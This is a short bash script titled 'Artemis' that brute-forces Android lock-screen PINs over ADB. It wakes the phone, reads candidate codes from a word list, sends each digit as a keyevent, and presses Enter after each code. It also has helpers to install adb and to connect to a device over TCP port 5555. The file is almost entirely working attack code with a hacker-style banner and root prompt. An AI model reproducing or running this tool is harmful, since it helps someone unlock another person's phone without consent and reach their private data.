#!/usr/bin/env bash

lb="\e[1;32m"
n="\e[0m"
lb="\e[1;34m"
clear
echo "Name :"$(hostname)
sleep 0.5
echo "Kenel : "$(uname)
sleep 0.5
echo "Your Ip : "$(ip -o route get to 8.8.8.8 | sed -n 's/.*src \([0-9.]\+\).*/\1/p')
sleep 0.6
clear

function balik() {
    clear
    balik=$(pwd)/'brut.sh'
    bash $balik
}

echo -e "${lb}
 _   _      _          ____ _                 
| \ | | ___| | _____  / ___| |__   __ _ _ __  
|  \| |/ _ \ |/ / _ \| |   | '_ \ / _' | '_ \ 
| |\  |  __/   < (_) | |___| | | | (_| | | | |
|_| \_|\___|_|\_\___/ \____|_| |_|\__,_|_| |_|

${n}"
date
echo -e "${lb}          Artemis ${n}"

echo " "
echo "1. Make List"
echo "2. BruteNow"
echo "3. Install Requirement"
echo "4. Check adb device"
echo "5. Connect/Disconnect TCP"
echo " "

read -p "root@artemis:#~  " chose

if [[ $chose == 1 ]]; 
    then
        gedit list.txt

    balik 

elif [[ $chose == 2 ]];
     then
     adb shell input keyevent 26 #press
     adb shell input keyevent 82
         echo "Your list : " ls *txt
         echo " "
         read -p "Input List : " file

             for i in `cat $file`; 
                do 
                    echo " "${i}
                 for (( j=0; j<${#i}; j++ )); 
                    do
                        adb shell input keyevent $((`echo ${i:$j:1}`+7))
                done
                adb shell input keyevent 66
            done
    balik  

elif [[ $chose == 3 ]];
    then 
        apt install adb
    
    balik

elif [[ $chose == 4 ]];
    then
        adb devices
    sleep 3
    
    balik

elif [[ $chose == 5 ]];
    then
    echo "1. Connect"
    echo "2. Disconnect"
    read -p ">> Input : " select

        if [[ $select == 1 ]];
            then
                    adb tcpip 5555
                read -p "Input Your Android IP : " ipaddres

                    adb connect $ipaddres:5555
            balik
        
        elif [[ $select == 2 ]];
            then 
                read -p "Input Your Android IP : " ipaddres

                    adb disconnect $ipaddres:5555
            balik
        fi
fi

